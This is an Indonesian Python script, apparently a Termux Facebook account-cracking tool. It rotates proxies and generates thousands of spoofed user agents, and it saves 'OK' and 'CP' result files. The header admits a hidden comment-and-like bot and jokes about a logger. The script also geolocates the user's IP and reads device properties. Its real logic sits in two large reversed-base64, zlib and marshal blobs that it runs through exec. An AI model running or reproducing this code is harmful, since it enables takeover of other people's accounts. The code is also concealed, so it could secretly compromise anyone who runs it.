##--------------------------------------------------------------------------------------------->
###hi gaes:) Hai bray🌝 Script ini 70% Hasil Recode Yaa, 
### jadi pastinya script ini 100% Free, 
###Tetap Bersyukur apa pun hasilnya yaa, okay
###--------------------------------------------------------------------------------------------->
#     *Note* Mengandung Bot Komen&like, angp sj sbgai tanda trima kasih!
#     *Loger? Pastinya Aman Dong,,
#     *Reapload *by Jun m.pakaya
#     *Thanks *To Alvino&Fall
###------------------------------------------------------------------>
#     *JANGGAN DI PREMIN YA BANGSAD:)
###------------------------------------------------------------------>

###------------------------------------------>
#     *IMPORT MODULE*
###------------------------------------------>
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as thread
from concurrent.futures import ThreadPoolExecutor as tred
import requests,bs4,json,os,sys,random,datetime,time,re
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
import requests,re,rich,sys,os,json,time
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich.console import Group as gp
from bs4 import BeautifulSoup as par
from rich.panel import Panel as nel
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console
from rich.text import Text as tekz
from rich.progress import track
from rich import print as prints
from rich import print as cetak
from rich import print as rprint
from rich import print as cetak
from rich.panel import Panel
from rich.table import Table
import urllib3,rich,base64
from rich.tree import Tree
from time import sleep
from rich import pretty
console = Console()
ses = requests.Session()
tulisan=[]
sound = []
login = []
loop = 0
dump = []
memek = []
ualu,ualuh = [],[]
sys.stdout.write('\x1b]2; haecerjoin | V7.0\x07')
###------------------------------------------------------------------>
#     *CEK WARNA RANDOM
###------------------------------------------------------------------>
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1,2]
	
except:
	junWik = "#00C8FF"
	stenly = "#FFFF00"
	mat = "#FFFFFF"
	fikri = "#00FF00"
	sabi = "#FF0000"
	color_panel = random.choice([junWik,sabi,stenly,mat,fikri])


M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
tulisan = random.choice([H2,K2,B2,P2])

bw = "[bold white]"
bc = "[bold cyan]"
bb = "[bold blue]"
br = "[bold red]"
by = "[bold yellow]"
bg = "[bold green]"
kontol = random.choice([bw,bc,bb,br,by,bg])
memek = random.choice([bc,bg,bw,by,bb,br])


###------------------------------------------------------------------>
#     *USER AGENT APPEND
###------------------------------------------------------------------>
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
munculapk=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
linux=[]
wind=[]
cokbrut=[]
dia=[]
lisensikuni,lisensiku=[],[]
ses=requests.Session()
princp=[]
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	cetak(panel('Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota'))
if sys.version_info.major != 3:
	exit(panel("{bg} type: python zmbf.py \n"))
	prox=open('.prox.txt','r').read().splitlines()
###------------------------------------------------------------------>
#     *USER AGENT RANDOM
###------------------------------------------------------------------>
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
    linux.append(uaku) 
    
    aa='Mozilla/ 5.0(Windows NT 10.0;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Win64; x64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36 Edg/93.0.961.52'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    wind.append(uaku2)
    
    aa='Mozilla/5.0 (Windows Mobile 10;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Android 10.0; Microsoft; Lumia 950XL)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Edge/40.15254.603'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    wind.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='WOW64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36 Vivaldi/6.0.2979.18'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    wind.append(uaku2)
    ugen.append(uaku2)
    
for t in range(10000):
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	wikwik=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	ter=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	lordjun=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	wind.append(lordjun)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'
	lite=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1 [FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'
	lite1=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	yah=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	yeh=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	sob=f'Dalvik/2.1.0 (Android {a}; {yeh} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yeh};FBSV/{a};FBCA'
	sip=f'Dalvik/2.1.0 (Android {a}; {yah} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yah};FBSV/{a};FBCA'
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	dal=f'Dalvik/2.1.0 (Android {a}; L-03K Build/{b}.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;FBDV/L-03K;FBSV/9;FBCA'
	hule = random.choice([ter,dal,wikwik,lite1,lite,sob,sip])
	ugen.append(hule)
	linux.append(hule)
###------------------------------------------------------------------>
#     *USER AGENT NEW
###------------------------------------------------------------------>
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 9: zh-cn: Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 9: zh-cn: Redmi 8A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###------------------------------------------------------------------>
#     *CEK WARNA INPUT
###------------------------------------------------------------------>
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'	
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

###------------------------------------------------------------------>
#     *GET TANGGAL-BULAN-TAHUN
###------------------------------------------------------------------>
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
###------------------------------------------------------------------>
#     *SUPORT SYSTEM
###------------------------------------------------------------------>
jalankey = 'Mendapatkan Akses Key....'
gh = 'ONE-Idz'
fbme = 'JUN V II'
wame = "08988884579"
kotaku = ses.get("http://ip-api.com/json/").json()["city"]
ip = ses.get("http://ip-api.com/json/").json()["query"]
negriku = ses.get("http://ip-api.com/json/").json()["country"]
versidev = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:sinyal = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:sinyal = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==Q6LFl7Lg/iwB/R+/1G637PXYu8/+zujPveI8g7w7/3BJA+5H/8DP/wQ/exLeh7etxx6KIF257bEonIH6gsH2e54T/w+XO+7/1nC979FfawFRzQT7u/xHZKxk35QXuYDn4eA1nYZnjjTOnkaQ8cPatYf6TmL5uqmnzcHYxNTMMFFTxIoYNb9Nl2Ko693oz6Zar6RteRE50MSAy8OUpaqDTTlsrh9l5ZsGzsGo6+aJ4YilVuskRmm42Yznd80GFpJtGM5+Fp33h0rBhPW4O1YMNjvWx0sNLB95ETLzCcDbyabVbDq8gUmPqzGatf1GURlUa3BsjcCildGsRDMuKh+3thTy20Q2nGtSwpFxD00G247CBnEoL71BU5KMsmYda455oofVKUae3g936wtp9d5Mg25Nqokx/chWHXDW2eDAVqP0pElEkWxbHO0+UAgeNZAmcta0DJm4e1pgt1KBg3wfzbLbHwRJN1ShJ4jA9iJrMFuRN8IqAhvz0I/G0ygqCbRVABcy0emEaSk7aOTJsIZcBpFnqlz2YHxAJDPBG2tHuW3yyih1Xxyb30mIVBwDmldxZ6R71xVa4TmJVquI7wvnm2h3GUrmRdgOIYSvIpXf5EcYjqYuke87Jx7+eoMy5kq1c2aY0UDeeVGW70sQfMsni56jVzBI2k2htzeMFiQ6jVEaEN8yEgLuSkCEp3RPhWDkTaZglP6qAtLOLieorfX64R7SoNbXUSr2QunsJVO0JZqoJ2IGZAjoqIUb/cqWEJswqvm8RVnxgcSBsjEZz7TBVwZZUYwNU9e5UBz9tVXBZVIbLMA1e3je0inCGxkx6STeSWmTHp3XrzSfjGZfL1JH1yMmfd7F4cZd3Spoq9CozMuGWho5yEgSp/i+YqJaFGpIf0ak7RB0ZT9mgNZohSZwa7L0Lt4NCVByrLQk4Rpo3BlE8rjd90dF1SZaxszm6oSFEhhHEKQRk4wmsaKSubiEBoLvXhuhL30eux6JzQcTybGPJrL/wRf8IoHmrr7uP025CFF86fb/c8tpPCL8C0E211iOouZgvbvf+6/dTz/BaCb7MXuM3vwlbCC0EXTVPPoTVVoDV2IAhdFptkBRmsLR/8ZVCsLJ/SlIb0mfJIdBdTgZNINGieEMtSqWehUY24Km1klxJe'))
def haecerjoin_tm(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def clear():
	os.system('clear')
def back():
	os.system('clear')
	login()

#haecerjoin_v otomatis
def haecerjoin_v(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
      
def haecerjoin_c(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.0001)
   
###------------------------------------------------------------------>
#     *BAGIAN MASUK
###------------------------------------------------------------------>
def closee():
	print("")
	prints(Panel(f"""{br}• {bw}Script Di Tutup Selama Idul Adha {br}•""",width=55,padding=(0,7),style=f"{color_panel}"))
	prints(Panel(f"""{br}• {bw}Kemungkinan Akan Buka Kembali Jam 19-00-wit {br}•""",width=55,padding=(0,3),style=f"{color_panel}"))
	time.sleep(0.3);os.system("xdg-open https://wa.me/+628988884579?text=Assalamwaalaikum+Bang,+Minalaidin+Walafaizin+Ya!");exit()
	



###------------------------------------->
#     *MASUK & INSTALL MODUL
###------------------------------------->
if __name__=='__main__':
	
	try:
		import clear
	except ImportError:
		os.system('clear')
	try:os.mkdir('/sdcard/juncepe')
	except:pass
	
	try:
		import rich
	except ImportError:
		prints(Panel(f"""{H2}• {P2}Modul rich Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
		os.system('pip install rich')
	try:os.mkdir('/sdcard/JUNZ-DUMP')		
	except:pass
	
	try:
		import stdiomask
	except ImportError:
		prints(Panel(f"""{H2}• {P2}Modul stdiomask Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
		os.system('pip install stdiomask')
	try:os.mkdir('/sdcard/Film Bokep18+')
	except:pass
	
	try:
		import flask
	except ImportError:
		prints(Panel(f"""{H2}• {P2}Modul flask Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
		os.system('pip install flask')
	try:os.system('touch .prox.txt')
	except:pass
	
	try:
		import npyscreen
	except ImportError:
		prints(Panel(f"""{H2}• {P2}Modul npyscreen Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
		os.system('pip install npyscreen')
	try:os.mkdir('/sdcard/junoke')
	except:pass
	try:
		import requests
	except ImportError:
		prints(Panel(f"""{H2}• {P2}Modul requests Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
		os.system('pip install requests && pip install mechanize ')
	try:closee()
	except:pass









_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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